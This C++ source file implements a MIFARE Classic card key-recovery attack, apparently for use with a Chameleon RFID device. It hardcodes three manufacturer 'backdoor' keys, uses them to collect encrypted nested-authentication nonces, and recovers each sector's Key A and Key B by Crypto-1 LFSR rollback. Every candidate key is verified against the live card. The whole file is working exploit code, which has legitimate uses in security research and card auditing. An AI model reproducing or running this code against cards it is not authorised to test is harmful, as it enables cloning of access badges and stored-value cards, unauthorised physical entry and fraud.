#include "MfcBackdoorSENRecovery.h"

#include <cstdlib>
#include <cstring>
#include <cstdio>

#include "utils/ble/ChameleonClient.h"
extern "C" {
#include "utils/crypto/crapto1.h"
}

namespace MfcBackdoorSENRecovery {
namespace {

constexpr uint32_t kMaxRecoveryCandidates = 100000;

constexpr uint8_t kBackdoorKeys[][6] = {
  {0xA3,0x96,0xEF,0xA4,0xE2,0x4F},
  {0xA3,0x16,0x67,0xA8,0xCE,0xC1},
  {0x51,0x8B,0x33,0x54,0xE7,0x60},
};
constexpr uint8_t kBackdoorKeyCount = sizeof(kBackdoorKeys) / sizeof(kBackdoorKeys[0]);

uint8_t trailerBlock(uint8_t sector) {
  return (sector < 32) ? (sector * 4 + 3) : (128 + (sector - 32) * 16 + 15);
}

int recoverKey(Result& result, uint8_t sector, bool keyB,
               uint32_t uid32, uint32_t nt, uint32_t ntEnc) {
  if (sector >= 40) return 0;
  if (keyB ? result.foundB[sector] : result.foundA[sector]) return 0;

  const uint32_t ks = ntEnc ^ nt;
  Crypto1State* revstate = lfsr_recovery32(ks, nt ^ uid32);
  if (!revstate) return 0;

  auto& client = ChameleonClient::get();
  const uint8_t block = trailerBlock(sector);
  const uint8_t keyType = keyB ? 0x61 : 0x60;
  bool found = false;
  int checked = 0;

  for (Crypto1State* rs = revstate; (rs->odd != 0 || rs->even != 0) && !found; ++rs) {
    lfsr_rollback_word(rs, nt ^ uid32, 0);
    uint64_t candidate = 0;
    crypto1_get_lfsr(rs, &candidate);

    Crypto1State* test = crypto1_create(candidate);
    crypto1_word(test, uid32 ^ nt, 0);
    const uint32_t testKs = crypto1_word(test, 0, 0);
    crypto1_destroy(test);
    if ((ntEnc ^ nt) != testKs) {
      if (++checked > kMaxRecoveryCandidates) break;
      continue;
    }

    uint8_t bytes[6];
    uint64_t tmp = candidate;
    for (int i = 5; i >= 0; --i) {
      bytes[i] = static_cast<uint8_t>(tmp & 0xFF);
      tmp >>= 8;
    }

    if (client.mf1CheckKey(block, keyType, bytes)) {
      if (keyB) {
        memcpy(result.keysB[sector], bytes, 6);
        result.foundB[sector] = true;
      } else {
        memcpy(result.keysA[sector], bytes, 6);
        result.foundA[sector] = true;
      }
      ++result.recovered;
      found = true;
    }
    if (++checked > kMaxRecoveryCandidates) break;
  }

  free(revstate);
  return found ? 1 : 0;
}

} // namespace

Result run(uint8_t sectors,
           const bool foundA[40], const bool foundB[40],
           const uint8_t keysA[40][6], const uint8_t keysB[40][6],
           ProgressFn progress) {
  Result result;
  memcpy(result.foundA, foundA, sizeof(result.foundA));
  memcpy(result.foundB, foundB, sizeof(result.foundB));
  memcpy(result.keysA, keysA, sizeof(result.keysA));
  memcpy(result.keysB, keysB, sizeof(result.keysB));

  if (sectors > 40) sectors = 40;

  auto& client = ChameleonClient::get();
  ChameleonClient::NestedSample samplesA[40] = {};
  ChameleonClient::NestedSample samplesB[40] = {};
  uint32_t uid32 = 0;
  int got = 0;
  bool acquired = false;

  if (progress) progress("Starting...", 0);
  for (uint8_t i = 0; i < kBackdoorKeyCount; ++i) {
    if (progress) {
      char msg[48];
      snprintf(msg, sizeof(msg), "Collecting SEN data (%u/%u)...",
               static_cast<unsigned>(i + 1), static_cast<unsigned>(kBackdoorKeyCount));
      progress(msg, static_cast<int>((i * 30) / kBackdoorKeyCount));
    }
    int n = 0;
    uint32_t uid = 0;
    if (!client.mf1EncNestedAcquire(kBackdoorKeys[i], sectors, 0,
                                    &uid, samplesA, samplesB, 40, &n) || n <= 0) {
      continue;
    }
    acquired = true;
    got = n;
    uid32 = uid;
    break;
  }
  result.acquired = acquired;
  if (!acquired) return result;

  const uint8_t nsec = static_cast<uint8_t>((got < sectors) ? got : sectors);
  for (uint8_t s = 0; s < nsec; ++s) {
    if (progress) {
      char msg[48];
      snprintf(msg, sizeof(msg), "Recovering keys (%u/%u)...",
               static_cast<unsigned>(s + 1), static_cast<unsigned>(nsec));
      progress(msg, 30 + static_cast<int>((s * 70) / (nsec ? nsec : 1)));
    }
    recoverKey(result, s, false, uid32, samplesA[s].nt, samplesA[s].ntEnc);
    recoverKey(result, s, true, uid32, samplesB[s].nt, samplesB[s].ntEnc);
  }

  result.success = result.recovered > 0;
  return result;
}

} // namespace MfcBackdoorSENRecovery
